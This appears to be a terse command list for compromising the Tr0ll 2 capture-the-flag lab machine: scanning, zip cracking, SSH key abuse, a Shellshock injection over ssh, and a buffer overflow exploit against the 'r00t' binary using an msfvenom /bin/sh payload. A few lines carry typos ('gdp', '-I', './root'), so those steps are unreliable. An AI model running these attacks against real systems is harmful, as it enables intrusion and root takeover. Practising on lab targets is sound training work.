Commands:

netdiscover -i eth1

nmap -p- -A (Tr0ll 2 IP)

ftp (Tr0ll 2 IP)
get lmao.zip
quit

dirb http://(Tr0ll 2 IP)

dirb http://(Tr0ll 2 IP) dirs

cd ~/Downloads

ls cat* -la

strings cat_the_troll3.jpg

vi base64
base64 --decode base64 | sort | uniq > decoded


fcrackzip -u -D -p decoded lmao.zip

chmod 700 noob

ssh noob@(Tr0ll 2 IP) -i noob

ssh -vv noob@(Tr0ll 2 IP) -i noob

ssh noob@(Tr0ll 2 IP) -i noob '() { :;}; echo SHELLSHOCK'
ssh noob@(Tr0ll 2 IP) -i noob '() { :;}; /bin/bash'

ssh-keygen -b 2048 -t rsa
echo "KEY" > .ssh/authorized_keys
ssh noob@192.168.56.120 -I .ssh/id_rsa

find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null

./r00t $(python -c 'print "A" * 1000')

locate pattern_create

pattern_create.rb -l 1000

gdb r00t

r (pattern from pattern_create.rb)

locate pattern_offset

pattern_offset.rb -q (string from gdb)

r $(python -c 'print "A" * 268 + "B" * 4')

env - gdp r00t

show env

unset env LINES
unset env COLUMNS

run $(python -c 'print "A" * 268 + "BBBB" + "\x90" * 16 + "C" * 100')

info registers

msfvenom --platform linux -p linux/x86/exec -f py CMD="/bin/sh" -b '\x00\x0a\x0d' -a x86 -e x86/shikata_ga_nai

env - ./root $(python -c 'print "A" * 268 + "\x80\xfc\xff\xbf" + "\x90" * 16 + "(MSFVENOM PAYLOAD)"')
